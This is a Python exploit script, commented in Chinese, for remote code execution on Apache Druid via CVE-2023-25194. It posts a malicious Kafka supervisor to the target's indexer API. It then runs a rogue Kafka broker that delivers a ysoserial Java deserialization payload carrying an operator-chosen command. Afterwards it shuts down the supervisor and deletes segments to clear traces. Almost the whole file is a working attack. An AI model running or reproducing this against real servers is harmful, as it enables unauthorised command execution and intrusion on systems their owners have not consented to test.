import requests
import argparse
import socket
import struct
import threading
import time
import os
import subprocess
import sys

"""
Apache Druid RCE (CVE-2023-25194)
适用版本: Druid <= 25.0.0 (开启 kafka-indexing-service 扩展)
原理: 提交恶意 Kafka 索引任务 → Druid 连接伪造的 Kafka Broker → Broker 投递 Java 反序列化 payload → RCE

使用前准备:
  wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
  java -jar ysoserial-all.jar CommonsCollections6 "id" > payload.bin
"""

ROGUE_HOST = None  # 运行时自动检测
ROGUE_PORT = 19092

# ==================== 协议常量 ====================

# Kafka API Keys
API_VERSIONS = 18
METADATA = 3
API_KEY_FETCH = 1
API_KEY_FIND_COORDINATOR = 10
API_KEY_JOIN_GROUP = 11
API_KEY_SYNC_GROUP = 14
API_KEY_OFFSET_FETCH = 9
API_KEY_LIST_OFFSETS = 2

# Kafka Error Codes
ERR_NONE = 0
ERR_UNKNOWN_TOPIC_OR_PARTITION = 3

def read_kafka_request(sock) -> tuple[int, int, bytes] | None:
    """读取 Kafka 请求: (api_key, api_version, body)"""
    try:
        raw = sock.recv(4)
        if len(raw) < 4:
            return None
        msg_size = struct.unpack(">i", raw)[0]
        data = b""
        while len(data) < msg_size:
            chunk = sock.recv(msg_size - len(data))
            if not chunk:
                return None
            data += chunk
        if len(data) < 4:
            return None
        api_key = struct.unpack(">h", data[:2])[0]
        api_version = struct.unpack(">h", data[2:4])[0]
        correlation_id = struct.unpack(">i", data[4:8])[0]
        return api_key, api_version, correlation_id, data[8:]
    except Exception:
        return None

def make_kafka_response(correlation_id: int, body: bytes) -> bytes:
    """构造 Kafka 响应帧"""
    payload = struct.pack(">i", correlation_id) + body
    return struct.pack(">i", len(payload)) + payload

def make_api_versions_response(correlation_id: int) -> bytes:
    """ApiVersions 响应 - 声明支持的 API"""
    body = struct.pack(">h", ERR_NONE)  # error_code
    body += struct.pack(">i", 5)  # num_api_keys
    for api_key in [API_VERSIONS, METADATA, API_KEY_FETCH, API_KEY_FIND_COORDINATOR, API_KEY_LIST_OFFSETS]:
        body += struct.pack(">h", api_key)
        body += struct.pack(">h", 0)  # min_version
        body += struct.pack(">h", 9)  # max_version
    body += struct.pack(">i", 0)  # throttle_time_ms
    body += struct.pack(">b", 0)  # _tagged_fields
    return make_kafka_response(correlation_id, body)

def make_metadata_response(correlation_id: int, topic_name: str) -> bytes:
    """Metadata 响应 - 告知 topic 存在，broker 就是我们自己"""
    body = struct.pack(">i", 0)  # throttle_time_ms
    body += struct.pack(">h", 1)  # num_brokers
    body += struct.pack(">i", 0)  # broker_id
    host_bytes = ROGUE_HOST.encode("utf-8")
    body += struct.pack(">h", len(host_bytes)) + host_bytes
    body += struct.pack(">i", ROGUE_PORT)
    body += struct.pack(">b", 0)  # _tagged_fields (broker)
    body += struct.pack(">b", 0)  # cluster_id is null
    body += struct.pack(">i", 1)  # num_topics
    body += struct.pack(">h", ERR_NONE)  # topic error code
    topic_bytes = topic_name.encode("utf-8")
    body += struct.pack(">h", len(topic_bytes)) + topic_bytes
    body += struct.pack(">b", 0)  # is_internal
    body += struct.pack(">i", 1)  # num_partitions
    body += struct.pack(">h", ERR_NONE)  # partition error code
    body += struct.pack(">i", 0)  # partition_index
    body += struct.pack(">i", 0)  # leader_id
    body += struct.pack(">i", 0)  # leader_epoch
    body += struct.pack(">i", 0)  # replica_nodes (empty)
    body += struct.pack(">i", 0)  # isr_nodes (empty)
    body += struct.pack(">i", 0)  # offline_replicas (empty)
    body += struct.pack(">b", 0)  # _tagged_fields (partition)
    body += struct.pack(">b", 0)  # _tagged_fields (topic)
    body += struct.pack(">b", 0)  # _tagged_fields (response)
    return make_kafka_response(correlation_id, body)

def make_find_coordinator_response(correlation_id: int) -> bytes:
    body = struct.pack(">h", 0)  # throttle_time_ms
    body += struct.pack(">h", ERR_NONE)  # error_code
    body += struct.pack(">h", 0)  # error_message (null string)
    body += struct.pack(">i", 0)  # coordinator node_id
    host_bytes = ROGUE_HOST.encode("utf-8")
    body += struct.pack(">h", len(host_bytes)) + host_bytes
    body += struct.pack(">i", ROGUE_PORT)  # coordinator port
    body += struct.pack(">b", 0)  # _tagged_fields
    return make_kafka_response(correlation_id, body)

def make_fetch_response(correlation_id: int, topic_name: str, payload: bytes) -> bytes:
    """Fetch 响应 - 把序列化 payload 作为消息返回"""
    body = struct.pack(">i", 0)  # throttle_time_ms
    body += struct.pack(">h", ERR_NONE)  # error_code
    body += struct.pack(">i", 0)  # session_id
    body += struct.pack(">i", 1)  # num_topics
    topic_bytes = topic_name.encode("utf-8")
    body += struct.pack(">h", len(topic_bytes)) + topic_bytes
    body += struct.pack(">i", 1)  # num_partitions
    body += struct.pack(">i", 0)  # partition_index
    body += struct.pack(">h", ERR_NONE)  # error_code
    body += struct.pack(">i", 0)  # high_watermark
    body += struct.pack(">i", 0)  # last_stable_offset
    body += struct.pack(">i", 0)  # log_start_offset
    body += struct.pack(">i", 0)  # aborted_transactions (empty)
    body += struct.pack(">i", 0)  # preferred_read_replica

    # Record Batch: 包装一个消息
    record_value = payload
    record_body = struct.pack(">q", 0)  # offset
    record_body += struct.pack(">i", len(record_value) + 14)  # message_size
    record_body += struct.pack(">i", 0)  # crc (unused but placeholder is wrong size)
    # Actually using message format v2 (magic=2):
    # Let me construct a proper record batch
    base_offset = struct.pack(">q", 0)
    batch_length = struct.pack(">i", 60 + len(record_value))
    partition_leader_epoch = struct.pack(">i", 0)
    magic = struct.pack(">b", 2)  # v2
    crc = struct.pack(">i", 0)  # crc32c placeholder
    attributes = struct.pack(">h", 0)
    last_offset_delta = struct.pack(">i", 0)
    base_timestamp = struct.pack(">q", 0)
    max_timestamp = struct.pack(">q", 0)
    producer_id = struct.pack(">q", -1)
    producer_epoch = struct.pack(">h", -1)
    base_sequence = struct.pack(">i", -1)
    records_count = struct.pack(">i", 1)

    # Single record
    record_attrs = struct.pack(">b", 0)
    record_timestamp = struct.pack(">b", 0)  # timestamp delta
    record_offset = struct.pack(">b", 0)  # offset delta

    key_bytes = b""
    key_len = encode_varint(len(key_bytes))
    value_len = encode_varint(len(record_value))

    record = record_attrs + record_timestamp + record_offset + key_len + key_bytes + value_len + record_value
    num_headers = encode_varint(0)
    record += num_headers

    record_batch = (base_offset + batch_length + partition_leader_epoch +
                    magic + crc + attributes + last_offset_delta +
                    base_timestamp + max_timestamp + producer_id +
                    producer_epoch + base_sequence + records_count + record)

    body += struct.pack(">i", len(record_batch)) + record_batch
    body += struct.pack(">b", 0)  # _tagged_fields (partition)
    body += struct.pack(">b", 0)  # _tagged_fields (topic)
    body += struct.pack(">b", 0)  # _tagged_fields (response)
    return make_kafka_response(correlation_id, body)

def encode_varint(value: int) -> bytes:
    """ZigZag Varint 编码"""
    zigzag = (value << 1) ^ (value >> 63)
    result = bytearray()
    while zigzag > 0x7f:
        result.append((zigzag & 0x7f) | 0x80)
        zigzag >>= 7
    if zigzag > 0:
        result.append(zigzag)
    else:
        result.append(0)
    return bytes(result)

def handle_connection(sock, addr, topic: str, payload: bytes):
    print(f"[+] Druid 连接来自: {addr[0]}:{addr[1]}")
    try:
        while True:
            req = read_kafka_request(sock)
            if req is None:
                break
            api_key, api_version, correlation_id, body = req
            print(f"[*] Kafka 请求: api_key={api_key}, corr_id={correlation_id}")

            if api_key == API_VERSIONS:
                sock.send(make_api_versions_response(correlation_id))
            elif api_key == METADATA:
                sock.send(make_metadata_response(correlation_id, topic))
            elif api_key == API_KEY_FIND_COORDINATOR:
                sock.send(make_find_coordinator_response(correlation_id))
            elif api_key in (API_KEY_FETCH, API_KEY_LIST_OFFSETS):
                sock.send(make_fetch_response(correlation_id, topic, payload))
                print(f"[+] payload 已投递 ({len(payload)} bytes)")
            else:
                # 其他请求返回空错误
                generic = struct.pack(">h", ERR_NONE)
                sock.send(make_kafka_response(correlation_id, generic))
    except Exception as e:
        print(f"[!] 连接异常: {e}")
    finally:
        sock.close()

def rogue_broker(host: str, port: int, topic: str, payload: bytes):
    """启动伪造 Kafka Broker"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    server.settimeout(30)

    print(f"[*] 伪造 Kafka Broker: {host}:{port}, topic={topic}")
    print(f"[*] 等待 Druid 连接...\n")

    try:
        while True:
            try:
                sock, addr = server.accept()
                t = threading.Thread(target=handle_connection, args=(sock, addr, topic, payload), daemon=True)
                t.start()
            except socket.timeout:
                break
    finally:
        server.close()

# ==================== 攻击逻辑 ====================

def generate_payload(cmd: str, gadget: str = "CommonsCollections6") -> bytes:
    """调用 ysoserial 生成 Java 反序列化 payload"""
    ysoserial_jar = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ysoserial-all.jar")

    if not os.path.exists(ysoserial_jar):
        print(f"[-] 未找到 ysoserial-all.jar")
        print(f"[!] 请下载: wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar")
        print(f"[!] 放到脚本同目录: {os.path.dirname(os.path.abspath(__file__))}")
        sys.exit(1)

    proc = subprocess.run(
        ["java", "-jar", ysoserial_jar, gadget, cmd],
        capture_output=True, timeout=30
    )
    if proc.returncode != 0:
        print(f"[-] ysoserial 生成失败: {proc.stderr.decode()}")
        sys.exit(1)
    return proc.stdout

def exploit(target: str, cmd: str, gadget: str, listen_host: str, listen_port: int):
    topic = "druid_exploit"

    print(f"[*] 生成 serialized payload (gadget={gadget})...")
    payload = generate_payload(cmd, gadget)
    print(f"[+] payload 大小: {len(payload)} bytes")

    # 启动 rogue broker 线程
    broker_thread = threading.Thread(
        target=rogue_broker, args=(listen_host, listen_port, topic, payload), daemon=True
    )
    broker_thread.start()
    time.sleep(1)

    # 提交 Kafka 索引任务
    task_url = f"{target}/druid/indexer/v1/supervisor"
    task_payload = {
        "type": "kafka",
        "spec": {
            "dataSchema": {
                "dataSource": topic,
                "timestampSpec": {"column": "timestamp", "format": "iso"},
                "dimensionsSpec": {"dimensions": ["data"]},
                "granularitySpec": {"queryGranularity": "none", "rollup": False},
                "metricsSpec": []
            },
            "ioConfig": {
                "type": "kafka",
                "consumerProperties": {
                    "bootstrap.servers": f"{listen_host}:{listen_port}",
                    "security.protocol": "PLAINTEXT"
                },
                "topic": topic,
                "inputFormat": {
                    "type": "json",
                    "flattenSpec": {"useFieldDiscovery": True}
                },
                "useEarliestOffset": True
            },
            "tuningConfig": {"type": "kafka"}
        }
    }

    print(f"[*] 提交恶意 Kafka supervisor 到: {task_url}")
    r = requests.post(task_url, json=task_payload, timeout=10)
    print(f"[*] 状态码: {r.status_code}")
    if r.status_code == 200:
        print(f"[+] Supervisor 已创建: {r.json().get('id', '')}")
    else:
        print(f"[-] 响应: {r.text[:500]}")

    print(f"\n[*] 等待 Druid 连接 rogue broker (最长 25 秒)...")
    time.sleep(25)

    # 清理
    supervisor_id = f"{topic}"
    print(f"[*] 清理 supervisor: {supervisor_id}")
    requests.post(f"{target}/druid/indexer/v1/supervisor/{supervisor_id}/shutdown", timeout=10)
    requests.post(f"{target}/druid/indexer/v1/supervisor/{supervisor_id}/terminate", timeout=10)
    r = requests.post(f"{target}/druid/indexer/v1/datasources/{topic}/segments/delete", timeout=10)
    print(f"[*] 清理状态: {r.status_code}")

def main():
    parser = argparse.ArgumentParser(description="Apache Druid RCE - CVE-2023-25194 (Kafka Deserialization)")
    parser.add_argument("-u", "--url", required=True, help="目标URL, 例: http://10.16.1.211:8888")
    parser.add_argument("-c", "--cmd", default="id", help="要执行的命令, 默认: id")
    parser.add_argument("-g", "--gadget", default="CommonsCollections6",
                        help="ysoserial gadget chain, 默认: CommonsCollections6")
    parser.add_argument("--lhost", help="本机 IP (Druid 能连到的地址, 默认自动检测)")
    parser.add_argument("--lport", type=int, default=19092, help="监听端口, 默认: 19092")
    args = parser.parse_args()

    target = args.url.rstrip("/")

    if args.lhost:
        listen_host = args.lhost
    else:
        # 通过连接获取本机出口 IP
        listen_host = socket.gethostbyname(socket.gethostname())

    global ROGUE_HOST
    ROGUE_HOST = listen_host

    print(f"[*] 目标: {target}")
    print(f"[*] 本机: {listen_host}:{args.lport}")

    # 检测 Druid
    try:
        r = requests.get(f"{target}/status", timeout=5)
        if r.status_code == 200:
            print(f"[+] Druid 版本: {r.json().get('version', 'unknown')}")
    except Exception:
        print("[-] 无法连接 Druid")

    print()
    exploit(target, args.cmd, args.gadget, listen_host, args.lport)

if __name__ == "__main__":
    main()
